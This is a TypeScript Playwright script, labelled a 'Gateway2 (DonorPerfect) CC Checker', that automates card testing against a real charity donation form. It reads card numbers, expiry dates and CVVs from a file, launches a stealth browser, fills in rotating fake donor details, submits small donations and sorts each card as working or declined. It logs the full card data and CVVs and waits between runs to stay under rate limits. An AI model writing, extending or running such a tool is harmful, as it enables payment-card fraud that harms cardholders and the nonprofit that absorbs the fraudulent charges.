import { Page, BrowserContext } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { launchStealthBrowser, createStealthContext } from '../shared/browser';

const currentDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.join(currentDir, '../../../');
const dataDir = path.join(rootDir, 'data');
const screenshotsDir = path.join(rootDir, 'screenshots/gateway2');
const resultsFile = path.join(dataDir, 'gateway2_results.txt');
const cardsFile = path.join(dataDir, 'cards.txt');
const gateway2LogFile = path.join(dataDir, 'gateway2_log.txt');
const progressFile = path.join(dataDir, 'gateway2_progress.txt');

if (!fs.existsSync(screenshotsDir)) fs.mkdirSync(screenshotsDir, { recursive: true });

function logToFile(msg: string) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  const formatted = `[${timestamp}] ${msg}`;
  console.log(formatted);
  fs.appendFileSync(gateway2LogFile, formatted + '\n');
}

  const testData = [
  { first: "John", last: "Smith", address: "123 Main St", city: "New York", state: "NY", postcode: "10001", email: "john.smith@email.com" },
  { first: "Jane", last: "Doe", address: "456 Oak Ave", city: "Los Angeles", state: "CA", postcode: "90001", email: "jane.doe@email.com" },
  { first: "Bob", last: "Johnson", address: "789 Pine Rd", city: "Chicago", state: "IL", postcode: "60601", email: "bob.johnson@email.com" },
  { first: "Alice", last: "Brown", address: "101 Elm St", city: "Houston", state: "TX", postcode: "77001", email: "alice.brown@email.com" },
  { first: "Charlie", last: "Wilson", address: "202 Maple Dr", city: "Phoenix", state: "AZ", postcode: "85001", email: "charlie.wilson@email.com" },
  { first: "Diana", last: "Taylor", address: "303 Cedar Ln", city: "Philadelphia", state: "PA", postcode: "19101", email: "diana.taylor@email.com" },
  { first: "Ethan", last: "Anderson", address: "404 Birch Rd", city: "San Antonio", state: "TX", postcode: "78201", email: "ethan.anderson@email.com" },
  { first: "Fiona", last: "Thomas", address: "505 Spruce Ave", city: "San Diego", state: "CA", postcode: "92101", email: "fiona.thomas@email.com" },
  { first: "George", last: "Jackson", address: "606 Willow St", city: "Dallas", state: "TX", postcode: "75201", email: "george.jackson@email.com" },
  { first: "Hannah", last: "White", address: "707 Palm Ct", city: "San Jose", state: "CA", postcode: "95101", email: "hannah.white@email.com" }
];

async function safeFill(page: Page, selector: string, value: string, fieldName: string) {
  try {
    await page.waitForSelector(selector, { timeout: 8000 });
    await page.fill(selector, value);
    logToFile(`[+] Filled ${fieldName}`);
    return true;
  } catch (e: any) {
    logToFile(`[!] Failed ${fieldName} (${selector}): ${e.message}`);
    return false;
  }
}

async function safeSelect(page: Page, selector: string, value: string, fieldName: string) {
  try {
    await page.waitForSelector(selector, { timeout: 8000 });
    await page.selectOption(selector, value);
    logToFile(`[+] Selected ${fieldName}: ${value}`);
    return true;
  } catch (e: any) {
    logToFile(`[!] Failed ${fieldName} (${selector}): ${e.message}`);
    return false;
  }
}

async function safeClick(page: Page, selector: string, buttonName: string) {
  try {
    await page.waitForSelector(selector, { timeout: 10000 });
    await page.click(selector, { force: true });
    logToFile(`[+] Clicked ${buttonName}`);
    return true;
  } catch (e: any) {
    logToFile(`[-] Failed ${buttonName} (${selector}): ${e.message}`);
    return false;
  }
}

async function processCard(page: Page, cardData: string, donor: any, runIndex: number): Promise<string> {
  const parts = cardData.split('|');
  if (parts.length < 4) return "SKIP";
  const [cc, mm, yy, cvv = ''] = parts;

  logToFile(`Starting Run ${runIndex}: ${cc.slice(-4)}`);

const URL = 'https://wl.donorperfect.net/weblink/FormSingleNM.aspx?formId=45&id=4&name=E348891QE';

  try {
    try {
      await page.goto(URL, { waitUntil: "domcontentloaded", timeout: 30000 });
    } catch (e: any) {
      if (e.message.includes('Timeout') || e.message.includes('Target page')) {
        console.log(`[gateway2] Navigation timed out — retrying with load...`);
        await page.goto(URL, { waitUntil: "load", timeout: 45000 });
      } else {
        throw e;
      }
    }

    // Then explicitly wait for the form to appear
    await page.waitForSelector('form, #form, input[name="amount"]', {
      timeout: 20000
    });

    // Other Amount button
    const otherAmountBtn = '#Part\\|23621\\|amount\\|A\\|Y\\|amount_divSecondColumn > label.btn.btn-primary.col-xs-12.other-amount > div > div > i';
    await safeClick(page, otherAmountBtn, 'Other Amount Button');
    await safeFill(page, 'input#Part\\|23621\\|amount\\|A\\|Y\\|amount_divSecondColumn input[type="text"], input[id*="amount"]', '2', 'Amount');

    // Donor fields
    await safeFill(page, '#first_name_ucTxtBox', donor.first, 'First Name');
    await safeFill(page, '#last_name_ucTxtBox', donor.last, 'Last Name');
    await safeFill(page, '#address_ucTxtBox', donor.address, 'Address');
    await safeFill(page, '#city_ucTxtBox', donor.city, 'City');
    await safeSelect(page, '#state_ucDDL', donor.state, 'State');
    await safeFill(page, '#email_ucEmail', donor.email, 'Email');

    // Card details
    await safeFill(page, '#CardAccountNum_ucNumericTxt', cc, 'Card Number');
    await safeSelect(page, '#ExpirationDate_ucExpirationMonth', mm.padStart(2, '0'), 'Expiry Month');
    await safeSelect(page, '#ExpirationDate_ucExpirationYear', yy, 'Expiry Year');

    // CVV (try multiple selectors)
    const cvvSelectors = ['input[id*="CVV"], input[id*="Cvv"], input[id*="SecurityCode"]'];
    let cvvFilled = false;
    for (const sel of cvvSelectors) {
      if (await safeFill(page, sel, cvv, 'CVV')) {
        cvvFilled = true;
        break;
      }
    }
    if (!cvvFilled) logToFile('[!] CVV field not found');

    // Confirm/Submit
    let submitted = await safeClick(page, '#btnConfirm12345', 'Confirm Button');
    if (!submitted) {
      await safeClick(page, 'button:has-text("Donate"), button:has-text("Submit"), input[type="submit"]', 'Fallback Submit');
    }

    // Wait for result indicators
    const successSelector = "text=/thank you/i, text=/successful/i, text=/received/i, text=/donation confirmed/i, text=/payment processed/i, .success, .thank-you";
    const failSelector = "text=/decline/i, text=/error/i, text=/invalid/i, text=/failed/i, text=/card declined/i, .error, .alert-danger";

    try {
      // Wait for ANY indicator of completion (success or fail)
      await page.waitForSelector(`${successSelector}, ${failSelector}`, { timeout: 30000 });
      logToFile("Result page detected");
    } catch (e) {
      logToFile("Timeout waiting for result selectors, analyzing page as-is");
    }

    // Small extra wait to ensure all elements are rendered
    await page.waitForTimeout(3000);

    const responseText = (await page.textContent('body') || '').slice(0, 2000);
    const pageText = responseText.toLowerCase();
    const currentUrl = page.url();

    // Check URL for success indicators
    const urlSuccess = /thank.?you|success|confirmed|receipt/i.test(currentUrl);

    let status = "UNKNOWN";

    // Check fail patterns first
    const failPatterns = ["declined", "failed", "invalid card", "insufficient funds", "error", "expired", "not authorized", "card declined", "cvv error", "security code", "try again"];
    for (const fp of failPatterns) {
      if (pageText.includes(fp)) {
        status = "FAIL";
        break;
      }
    }

    // If not failed, check success patterns
    if (status !== "FAIL") {
      const successPatterns = ["thank you", "successful", "received", "donation confirmed", "payment processed", "reference number", "receipt number", "transaction complete", "your donation has been processed", "donation processed", "payment successful", "order confirmed"];
      for (const sp of successPatterns) {
        if (pageText.includes(sp) || urlSuccess) {
          status = "SUCCESS";
          break;
        }
      }

      // If still UNKNOWN and page contains form elements, likely didn't submit
      if (status === "UNKNOWN" && (pageText.includes('<form') || pageText.includes('input[name="amount"]') || pageText.includes('btnConfirm'))) {
        status = "FORM_STILL_VISIBLE";
        logToFile(`Form still visible - likely submit failed`);
      }
    }

    const screenshotName = `result_${cc.slice(-4)}_${Date.now()}.png`;
    await page.screenshot({ path: path.join(screenshotsDir, screenshotName), fullPage: true });

    const ts = new Date().toISOString();
    fs.appendFileSync(resultsFile, `${cc}|${mm}|${yy}|${cvv}|${status}|${screenshotName}|${ts}\n`);

    // Log page text for debugging UNKNOWN cases
    if (status === "UNKNOWN") {
      logToFile(`UNKNOWN Debug - Page text snippet: ${pageText.substring(0, 200)}...`);
    }

    logToFile(`Result ${runIndex}: ${status} (${screenshotName}) - URL: ${currentUrl}`);
    return status;

  } catch (err: any) {
    logToFile(`Error Run ${runIndex}: ${err.message}`);
    const screenshotName = `crash_${cc.slice(-4)}_${Date.now()}.png`;
    await page.screenshot({ path: path.join(screenshotsDir, screenshotName), fullPage: true });
    const ts = new Date().toISOString();
    fs.appendFileSync(resultsFile, `${cc}|${mm}|${yy}|${cvv}|ERROR|${screenshotName}|${ts}\n`);
    return `ERROR: ${err.message}`;
  }
}

async function main() {
  const targetFile = cardsFile;
  if (!fs.existsSync(targetFile)) {
    logToFile(`File not found: ${targetFile}`);
    return;
  }

  logToFile("=== Gateway2 (DonorPerfect) CC Checker Started ===");

  const { browser } = await launchStealthBrowser({ mobile: true });

  const content = fs.readFileSync(targetFile, 'utf-8').trim();
  if (!content) {
    logToFile("No cards found.");
    await browser.close();
    return;
  }

  const lines = content.split('\n').map(l => l.trim()).filter(l => l);
  let currentIndex = 0;
  if (fs.existsSync(progressFile)) {
    currentIndex = parseInt(fs.readFileSync(progressFile, 'utf8').trim() || '0');
  }

  while (currentIndex < lines.length) {
    const currentCard = lines[currentIndex];
    const donor = testData[(currentIndex % testData.length)];

    const context = await createStealthContext(browser, { mobile: true });
    const page = await context.newPage();

    const status = await processCard(page, currentCard, donor, currentIndex + 1);
    await context.close();

    currentIndex++;
    fs.writeFileSync(progressFile, currentIndex.toString());
    logToFile(`Progress: ${currentIndex}/${lines.length} (${status}). ${lines.length - currentIndex} remaining.`);

    if (currentIndex < lines.length) {
      await new Promise(r => setTimeout(r, 3500)); // Rate limit
    }
  }

  // Cleanup
  fs.writeFileSync(targetFile, '');
  if (fs.existsSync(progressFile)) fs.unlinkSync(progressFile);
  await browser.close();
  logToFile("=== Gateway2 Session Finished ===");
}

main().catch(err => {
  logToFile(`Critical error: ${err}`);
  process.exit(1);
});

